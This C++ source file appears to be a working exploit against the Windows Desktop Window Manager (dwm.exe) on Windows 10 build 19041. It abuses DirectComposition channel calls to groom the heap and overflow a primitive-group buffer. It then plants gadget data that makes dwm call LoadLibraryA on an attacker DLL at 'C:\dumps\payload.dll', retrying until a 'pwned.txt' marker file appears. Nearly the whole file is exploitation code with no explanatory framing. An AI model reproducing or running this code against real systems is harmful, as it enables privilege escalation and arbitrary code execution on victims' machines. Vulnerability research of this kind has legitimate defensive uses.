#define _CRT_SECURE_NO_WARNINGS
#ifndef UNICODE
#define UNICODE
#endif

#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <psapi.h>
#include <sstream>
#include <string>
#include <memory>


#include "ponylib/nt.h"
#include "ponylib/win32u.h"
#include "ponylib/memory.h"

#include "dcomp.h"


#define INIT() LoadLibraryA("user32.dll")

#define ClassName   L"I0p_Window"
#define WindowTitle L"I0p_Window_Title"

#define DCompResourceSurfaceBrushMarshaler             180
#define DCompResourcePrimitiveGroupLayerClipMarshaler  128
#define DCompResourceSharedSectionMarshaler            169
#define DCompResourceSpriteVisualMarshaler             178
#define DCompResourceLegacyRenderTargetMarshaler       94
#define DCompResourceVisualTargetMarshaler             201
#define DCompResourceVisualMarshaler                   195
#define DCompResourceCompositionGlyphRunMarshaler      33
#define DCompResourceCompositionSurfaceBitmapMarshaler 40
#define DCompResourceCManipulationMarshaler            103 // -
#define DCompResourceCaptureControllerMarshaler        16  // -
#define DCompResourceCVisualCaptureMarshaler           196 // -
#define DCompResourceCInteractionMarshaler             87  // 

#define VisualTargetRootVisual 13

#pragma pack(push, 1)
struct My_MilRectD {
    float left;
    float top;
    float right;
    float bottom;     
};
struct My_CPrimitiveGroupBatchHeader{ 
    ULONG32 field_0;
    ULONG32 field_4 ;
    ULONG32 field_8 ;
    ULONG32 field_C ;
    ULONG32 field_10;
    ULONG32 field_14;
    ULONG32 field_18;
    ULONG32 field_1C;
    ULONG32 field_20;
    ULONG32 field_24;
    ULONG32 field_28;
    ULONG32 field_2C;
    ULONG32 field_30;
    ULONG32 field_34;
    ULONG32 field_38;
};
#pragma pack(pop)

BOOL get_version_info(DWORD& dwBuildNumber, DWORD& dwMinorVersion, DWORD& dwMajorVersion) {
    OSVERSIONINFOEXW osinfo;

    NTSTATUS(WINAPI *RtlGetVersion)(LPOSVERSIONINFOEXW);
    
    *(FARPROC*)&RtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");

    if (NULL == RtlGetVersion) {
        return FALSE;
    }
    
    osinfo.dwOSVersionInfoSize = sizeof(osinfo);
    RtlGetVersion(&osinfo);

    dwBuildNumber = osinfo.dwBuildNumber;
    dwMinorVersion = osinfo.dwMinorVersion;
    dwMajorVersion = osinfo.dwMajorVersion;
    
    return TRUE;
}

ULONG64 get_fnCopyData_vtbl(UINT32 offset) {
    DWORD dwBuildNumber;
    DWORD dwMinorVersion;
    DWORD dwMajorVersion;

    if (get_version_info(dwBuildNumber, dwMinorVersion, dwMajorVersion) != TRUE) {
        return -1;
    }
    
    if (dwMinorVersion != 0 && dwMajorVersion != 0x0A) {
        return -1;
    }
    
    PCHAR hUser32 = (PCHAR)GetModuleHandleW(L"User32.dll"); 

    if (dwBuildNumber == 0x4A65) {
        return (ULONG64)(hUser32 + 0x91070) - offset; // Windows 10 19041
    }

    return -1;
}


bool setup_dwm_resources_tree(dcomp_channel_t& channel, dcomp_shared_section_t& section, HANDLE hcomp, PUINT32 pSpriteVisual, PUINT32 pSurfaceBrush) {
    My_MilRectD boundsRect;
    
    // assign identifiers fo resources
    auto dwSurfaceBrushIndex = channel.nextIndex();
    auto dwPrimitiveGroupLayerClipIndex = channel.nextIndex();
    auto dwSpriteVisualMarshalerIndex = channel.nextIndex();
    auto dwContainerMarshalerIndex = channel.nextIndex();
    auto dwCompositionSurfaceBitmapMarshaler = channel.nextIndex();
    auto dwVisualTargetIndex = channel.nextIndex();

    channel.openSharedResource(
        dwVisualTargetIndex,
        (UINT64)hcomp,
        0xc9,
        0
    );
    channel.createResource(
        DCompResourceSurfaceBrushMarshaler,
        dwSurfaceBrushIndex,
        0
    );
    channel.createResource(
        DCompResourcePrimitiveGroupLayerClipMarshaler,
        dwPrimitiveGroupLayerClipIndex,
        0
    );
    channel.createResource(
        DCompResourceSpriteVisualMarshaler,
        dwSpriteVisualMarshalerIndex,
        0
    );  
    channel.createResource(
        DCompResourceVisualMarshaler,
        dwContainerMarshalerIndex,
        0
    );
    channel.createResource(
        DCompResourceCompositionSurfaceBitmapMarshaler,
        dwCompositionSurfaceBitmapMarshaler,
        0
    );
    auto r = channel.apply();
    if (!r) {
        wprintf(L"[+][setup_dwm_resources_tree] failed to create resources status=%08X\n", channel.error());
        return false;
    }

    wprintf(L"[+][setup_dwm_resources_tree] Resources : COMMITED \n");
    wprintf(L"[+][setup_dwm_resources_tree]    => VisualTarget=%08X\n", dwVisualTargetIndex);
    wprintf(L"[+][setup_dwm_resources_tree]    => SpriteVisualMarshaler=%08X\n", dwSpriteVisualMarshalerIndex);
    wprintf(L"[+][setup_dwm_resources_tree]    => PrimitiveGroupLayerClip=%08X\n", dwPrimitiveGroupLayerClipIndex);
    wprintf(L"[+][setup_dwm_resources_tree]    => SurfaceBrush=%08X\n", dwSurfaceBrushIndex);
    wprintf(L"[+][setup_dwm_resources_tree]    => VisualMarshaler=%08X\n", dwContainerMarshalerIndex);
    wprintf(L"[+][setup_dwm_resources_tree]    => SurfaceBitmap=%08X\n", dwCompositionSurfaceBitmapMarshaler);

    /* set container as root element */
    channel.setReferenceProperty(
        dwVisualTargetIndex,
        VisualTargetRootVisual,
        dwContainerMarshalerIndex
    );
    channel.addVisualChild(
        dwContainerMarshalerIndex,
        dwSpriteVisualMarshalerIndex,
        0,
        0
    );
    
    r = channel.apply();
    if (!r) {
        wprintf(L"[+][setup_dwm_resources_tree] failed to create visual target relationship commands status=%08X\n", channel.error());
        return false;
    }
    wprintf(L"[+][main] VisualTarget Relationship: COMMITED \n");
    
    /* setup container */
    channel.setFloatProperty(dwContainerMarshalerIndex, 35, 1.0f);
    channel.setFloatProperty(dwContainerMarshalerIndex, 36, 1.0f);

    channel.setFloatProperty(dwContainerMarshalerIndex, 0, 124.0f); // offset.x
    channel.setFloatProperty(dwContainerMarshalerIndex, 1, 12.0f);  // offset.y
    channel.setFloatProperty(dwContainerMarshalerIndex, 2, 0.0f);  // offset.z

    r = channel.apply();
    if (!r) {
        wprintf(L"[+][setup_dwm_resources_tree] failed to set visual target properties status=%08X\n", channel.error());
        return false;
    }
   
    wprintf(L"[+][setup_dwm_resources_tree] VisualTarget Properties : COMMITED \n");

    /* setup clip */
    channel.setIntegerProperty(
        dwPrimitiveGroupLayerClipIndex,
        4,
        0x4000
    );
    channel.setIntegerProperty(
        dwPrimitiveGroupLayerClipIndex,
        3,
        0x0000
    );

    // [2] >= *a1 && [3] >= [1];
    boundsRect.left = 15;   // [0]
    boundsRect.top = 1;     // [1]
    boundsRect.right = 64;  // [2]
    boundsRect.bottom = 10; // [3]

    channel.setBufferProperty(
        dwPrimitiveGroupLayerClipIndex,
        6,
        &boundsRect,
        sizeof(My_MilRectD)
    );
    channel.setReferenceProperty(
        dwPrimitiveGroupLayerClipIndex,
        2,
        section.index()
    );
 
    UINT32 surfacesSources[1] = { (UINT32)dwCompositionSurfaceBitmapMarshaler };

    channel.setReferenceArrayProperty(
        dwPrimitiveGroupLayerClipIndex,
        0,
        surfacesSources,
        1
    );

    r = channel.apply();
    if (!r) {
        wprintf(L"[+][setup_dwm_resources_tree] failed to process primitive group layer clip commands status=%08X\n", channel.error());
        return false;
    }
    wprintf(L"[+][setup_dwm_resources_tree] PrimitiveGroupLayerClip : COMMITED \n");

    /* setup brush */

    My_MilRectD rect;
    rect.left = 15;  // [0]
    rect.top = 1;    // [1]
    rect.right = 64; // [2]
    rect.bottom = 10; // [3]

    channel.setBufferProperty(
        dwSurfaceBrushIndex,
        1,
        &rect,
        sizeof(My_MilRectD)
    );
    channel.setReferenceProperty(
        dwSurfaceBrushIndex,
        0,
        dwPrimitiveGroupLayerClipIndex
    );
    
    r = channel.apply();
    if (!r) {
        wprintf(L"[+][setup_dwm_resources_tree] failed to process surface brush commands status=%08X\n", channel.error());
        return false;
    }

    wprintf(L"[+][setup_dwm_resources_tree] SurfaceBrush : COMMITED \n");

    /* setup sprite */
    // set size
    channel.setFloatProperty(dwSpriteVisualMarshalerIndex, 24, 169.0f); // size.x
    channel.setFloatProperty(dwSpriteVisualMarshalerIndex, 25, 169.0f); // size.y 382
    // set offset
    channel.setFloatProperty(dwSpriteVisualMarshalerIndex, 0, 382.0f); // offset.x
    channel.setFloatProperty(dwSpriteVisualMarshalerIndex, 1, 88.0f);  // offset.y
    channel.setFloatProperty(dwSpriteVisualMarshalerIndex, 2, 0.0f);   // offset.z

    r = channel.apply();
    if (!r) {
        wprintf(L"[+][setup_dwm_resources_tree] failed to process sprite visual commands status=%08X\n", channel.error());
        return false;
    }

    wprintf(L"[+][setup_dwm_resources_tree] SpriteVisual Properties: COMMITED \n");

    *pSpriteVisual = dwSpriteVisualMarshalerIndex;
    *pSurfaceBrush = dwSurfaceBrushIndex;

    return true;
}

void setup_shared_section_data(LPVOID pSharedSectionData) {
    auto lpBatchHeaderPG = (My_CPrimitiveGroupBatchHeader*)pSharedSectionData;

    auto targetLFHSize = 0x6C0;

    // sizeof(CManipulationMarshaler) + sizeof(Gadgets)
    //   -> sizeof(Gadgets) = sizeof(GadgetsData) + sizeof(HeapEntry)
    //   -> maximum size of gadgets that we could have is 0x8F
    //   -> btw we could use negative offset to overcome limitation above 
    lpBatchHeaderPG->field_10 = targetLFHSize + 0x80 + 0x08; // batches_1
    lpBatchHeaderPG->field_C  = targetLFHSize + 0x300; // for stability purposes it should not to be allocated in the same LFH bucket 
    lpBatchHeaderPG->field_0 = 0x01;

    lpBatchHeaderPG->field_1C = -1;

    PCHAR pTriggerData = (PCHAR)(pSharedSectionData) + sizeof(My_CPrimitiveGroupBatchHeader);
    memset(pTriggerData, 0x41, lpBatchHeaderPG->field_10);

    // set values to satisfy CPrimitiveGroup::ValidateBatches
    //  if ( *(_DWORD *)(i + a2) > 3u || *(_DWORD *)(i + a2 + 0xC) > 7u )
    for (int i = 0; i < 12; i++ ) {
        *(DWORD*)(pTriggerData + i * 0x90) = 0x0;
        *(DWORD*)(pTriggerData + i * 0x90 + 0x0C) = 0x0;
    }

    wprintf(L"[+][exploit] setup shared section data : OK\n");
    // setup gadgets
    // pBuffer + sizeof(buffer) + sizeof(heapentry)

    CHAR acsPayloadPath [256] = {0};
    // GetCurrentDirectoryA(256, acsPayloadPath);
    
    strcat(acsPayloadPath, "C:\\dumps\\payload.dll");

    PCHAR command = acsPayloadPath;

    // because actual object ptr is shifted on 8 we have to add 8 to gadgets data
    // v79 = CInteraction::CInteraction(v78, (struct CComposition *)a1);
    // ActualObjectPtr = (void **)((char *)v79 + 8); <----- ???

    PCHAR pGadgetsData = pTriggerData + targetLFHSize + 0x10 + 0x08;
    *(PULONG64)(pGadgetsData) = get_fnCopyData_vtbl(0xB0);
    *(PULONG32)(pGadgetsData + 0x08) = 1; // number of pointers for FixupCallbackPointers
    *(PULONG64)(pGadgetsData + 0x20) = 0;
    *(PULONG32)(pGadgetsData + 0x18) = 0x30;
    *(PULONG64)(pGadgetsData + 0x68) = (ULONG64)GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");

    wprintf(L"[+][exploit] LoadLibraryA: %p\n", (PVOID)(*(PULONG64)(pGadgetsData + 0x68)));

    *(PULONG64)(pGadgetsData + 0x28) = 0x38;
    *(PULONG64)(pGadgetsData + 0x30) = 0x28;
    
    strcpy(pGadgetsData + 0x38, command);

    wprintf(L"[+][exploit] setup gadgets : OK\n");
}

bool normalize_LFH(dcomp_channel_t& channel, UINT32 resourceType, int count) {
     for (int i = 0; i < count; i++) {
        int dwIndex = channel.nextIndex();
                
        channel.createResource(
            resourceType,
            dwIndex,
            0
        );
    }

    if ( !channel.apply() ) {
        return false;
    }
    return true;
}

BOOL create_window_class(std::wstring className) {
    WNDCLASSEXW wcex;
    memset(&wcex, 0, sizeof(WNDCLASSEXW));

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.lpfnWndProc = DefWindowProc;
    wcex.lpszClassName = className.c_str();
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra = 0;
    wcex.hInstance = GetModuleHandleA(NULL);

    if (RegisterClassExW(&wcex) == NULL) {
        return FALSE;
    }
    return TRUE;
}

BOOL destroy_window_class(std::wstring className) {
    return UnregisterClassW(className.c_str(), GetModuleHandle(0));
};

HWND create_window(std::wstring className, std::wstring windowName, DWORD width, DWORD height) {
    HWND hwnd = CreateWindowW(
        className.c_str(),
        windowName.c_str(),
        WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, 
        0,
        width,
        height,
        nullptr,
        nullptr,
        nullptr,
        nullptr
    );
    
    return hwnd;
}


UINT32 dwm_pid() {
    ponylib::nt::proc_snapshot_t ntsnap;
    
    if (!NT_SUCCESS( ntsnap.build() ) ) {
        return -1;
    }

    auto dwm_processes = ntsnap.filter([](auto& proc){ return proc.filename == L"dwm.exe"; });
    if (dwm_processes.size() == 0) {
        return -1;
    }

    return dwm_processes.back().processId;
}

bool attempt(int iAttempt, int numberOfLFHAllocations, int numberOfMessagesToPass, int numberOfLFHAllocationsForNormalization, UINT32 dwTypeIdForLFHAllocations) {
    bool bAttemptOk = true;

    auto counter = 0;
    
    auto dwmProcessId = dwm_pid();

    HWND   hwnd  = NULL;
    HANDLE hcomp = NULL;

    UINT32 dwSpriteVisual;
    UINT32 dwSurfaceBrush;

    SIZE_T sizeCh = 0x40000;
    
    std::shared_ptr<dcomp_channel_t>        ch = nullptr;
    std::shared_ptr<dcomp_shared_section_t> section = nullptr;

    if ( FALSE == create_window_class(ClassName) ) {
        wprintf(L"[+][attempt][%d] failed to create window class. GetLastError(): %08x\n", iAttempt, GetLastError());
        bAttemptOk = false;
        goto cleanup;
    }

    hwnd = create_window(ClassName, WindowTitle, 900, 672);
    if ( NULL == hwnd ) {
        wprintf(L"[+][attempt][%d] failed to create window. GetLastError(): %08x\n", iAttempt, GetLastError());
        bAttemptOk = false;
        goto cleanup;
    }
    
    ShowWindow(hwnd, 1);
	UpdateWindow(hwnd);

    wprintf(L"[+][attempt][%d] hwnd=%p\n", iAttempt, hwnd);
    

    auto ntstatus = (*ponylib::win32u::kNtUserCreateDCompositionHwndTarget)(
        hwnd,
        1,
        &hcomp
    );
    if (!NT_SUCCESS(ntstatus)) {
        wprintf(L"[+][attempt][%d] failed to create window. status=%08x\n", iAttempt, ntstatus);
        bAttemptOk = false;
        goto cleanup;
    }

    wprintf(L"[+][attempt][%d] hcomp=%p\n", iAttempt, hcomp);

    ch = std::make_shared<dcomp_channel_t>(sizeCh);
    if (!ch->ok()) {
        wprintf(L"[+][attempt][%d] failed to create channel. status=%08x\n", iAttempt, ch->error());
        bAttemptOk = false;
        goto cleanup;
    }

    wprintf(L"[+][attempt][%d] hch=%p\n", iAttempt, ch->hch());

    section = std::make_shared<dcomp_shared_section_t>(ch.get(), ch->nextIndex(), DCompResourceSharedSectionMarshaler, 0x4000);
    if (!section->ok()) {
        wprintf(L"[+][attempt][%d] failed to create shared section. status=%08x\n", iAttempt, section->error());
        bAttemptOk = false;
        goto cleanup;
    }
    wprintf(L"[+][attempt][%d] SharedSection : OK\n",       iAttempt);
    wprintf(L"[+][attempt][%d]    => SharedSection=%08X\n", iAttempt, section->index());
    wprintf(L"[+][attempt][%d]    => hSharedSection=%p\n",  iAttempt, section->handle());
    wprintf(L"[+][attempt][%d]    => pSharedSection=%p\n",  iAttempt, section->base());

    setup_shared_section_data(section->base());

    bAttemptOk = setup_dwm_resources_tree(
        *ch,
        *section,
        hcomp,
        &dwSpriteVisual,
        &dwSurfaceBrush
    );
    if (!bAttemptOk) {
        wprintf(L"[+][attempt][%d] failed to create resources hierarchy\n", iAttempt);
        bAttemptOk = false;
        goto cleanup;
    }

    wprintf(L"[+][attempt][%d] make allocations in LFH: %d\n", iAttempt, numberOfLFHAllocations);
    
    int dwTriggerResource[256];
    int iTriggerResource = 0;

    auto normalizationOk = normalize_LFH(*ch, dwTypeIdForLFHAllocations, numberOfLFHAllocationsForNormalization);
    if (!normalizationOk) {
        wprintf(L"[+][attempt][%d]  => LFH normalization failed: %d\n", iAttempt, numberOfLFHAllocationsForNormalization);
        bAttemptOk = false;
        goto cleanup;
    } 
    
    wprintf(L"[+][attempt][%d]  => LFH normalization: OK (%d)\n", iAttempt, numberOfLFHAllocationsForNormalization);

    for (int i = 0; i < numberOfLFHAllocations; i++) {
        int dwIndex = ch->nextIndex();
                
        ch->createResource(
            dwTypeIdForLFHAllocations,
            dwIndex,
            0
        );

        dwTriggerResource[iTriggerResource++] = dwIndex;

        if (dwmProcessId != dwm_pid()) {
             wprintf(L"[+][attempt][%d] dwm crash detected during LFH allocations. Reset.\n", iAttempt );
            bAttemptOk = false;
            goto cleanup;
        }
        
        //  wprintf(L"[+][attempt][%d]     -> LFH Allocated: %d (%d)\n", iAttempt, dwIndex, i );
    }
    if ( !ch->apply() ) {
        wprintf(L"[+][attempt][%d] failed to create resources in LFH\n status=%08x", iAttempt, ch->error() );
        bAttemptOk = false;
        goto cleanup;
    }

    wprintf(L"[+][attempt][%d]  => LFH bruteforce: OK (%d)\n", iAttempt, numberOfLFHAllocations);
    
    // trigger vulnerability
    ch->setReferenceProperty(
        dwSpriteVisual,
        51,
        dwSurfaceBrush
    );
    if ( !ch->apply() ) {
        wprintf(L"[+][attempt][%d] failed to set trigger\n status=%08x", iAttempt, ch->error() );
        bAttemptOk = false;
        goto cleanup;
    }

    wprintf(L"[+][attempt][%d] Trigger : COMMITED \n", iAttempt);
    
    for (int i = 0 ; i < numberOfMessagesToPass; i++ ) {
        MSG msg;
        // Main message loop:
        GetMessage(&msg, nullptr, 0, 0);
        wprintf(L"[+][attempt][%d]: wparam=%p lparam=%p msg=%d\n", iAttempt, (LPVOID)msg.wParam, (LPVOID)msg.lParam, msg.message);
        if (!TranslateAccelerator(msg.hwnd, NULL, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    Sleep(5000);

    ch->apply();
    ch->apply();
    ch->apply();
    ch->apply();
    ch->apply();
    ch->apply();
    ch->apply();
    ch->apply();
    ch->apply();
    ch->apply();

    for (int i = 0; i < iTriggerResource; i++) {
        auto dwIndex = dwTriggerResource[i];
        wprintf(L"[+][attempt][%d]     -> LFH Release: %d (%d)\n", iAttempt, dwIndex, i );

        ch->releaseResource(dwIndex);
    }
     if ( !ch->apply() ) {
        wprintf(L"[+][attempt][%d] failed to release resources in LFH\n status=%08x", iAttempt, ch->error() );
        bAttemptOk = false;
        goto cleanup;
    }

    Sleep(5000);

    HANDLE hFile = CreateFileA("C:\\dumps\\pwned.txt", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) { 
        wprintf(L"[+][attempt][%d] exploitation completed. Bye!\n", iAttempt);
        bAttemptOk = true;
        goto cleanup;
    }

    bAttemptOk = false;

    wprintf(L"[+][attempt][%d] exploitation failed. Let's try again!\n", iAttempt);

cleanup:
    if (section){
        section.reset();
    }

    if (ch) {
        ch.reset();
    }
    if (hcomp) {
        (*ponylib::win32u::kNtUserDestroyDCompositionHwndTarget)(
            hwnd,
            hcomp
        );
    }
    if (hwnd) {
        DestroyWindow(hwnd);
    }
    destroy_window_class(ClassName);

    return bAttemptOk;
}

bool exploit() {
    auto bExploitOk = true;
    auto iAttempt = 0;

    auto prevDwmProcessId = 0;
    auto numberOfLFHAllocations = 33;
    auto defaultNumberOfLFHAllocations = numberOfLFHAllocations;
    auto defaultNumberOfLFHAllocationsForNormalization = 0x1000;

    while(true) {
        auto dwmProcessId = dwm_pid();
        wprintf(L"[+][attempt][%d] dwmProcId=%d LFHAllocations=%d\n", iAttempt, dwmProcessId, numberOfLFHAllocations);
    
        if (attempt(iAttempt, numberOfLFHAllocations, 3, defaultNumberOfLFHAllocationsForNormalization, DCompResourceCInteractionMarshaler)) {
            break;
        }

        if (prevDwmProcessId == 0) {
            prevDwmProcessId = dwmProcessId;
        }
        
        numberOfLFHAllocations += 1;

        // if (prevDwmProcessId != dwmProcessId) {
        //     wprintf(L"[+][attempt][%d] reset number of allocations to default value  because dwm crashed\n", iAttempt);
        //     numberOfLFHAllocations = defaultNumberOfLFHAllocations;
        // }

        iAttempt++;
    }

    return bExploitOk;
};


int
__cdecl
wmain(
    int argc,
    __in_ecount(argc) wchar_t* argv[])
{ 
   
    INIT();

    UINT32 return_code = 0;
    
    wprintf(L"[?][main] PID=%x\n", GetCurrentProcessId());
    wprintf(L"[?][main] TID=%x\n", GetCurrentThreadId());

    exploit();
}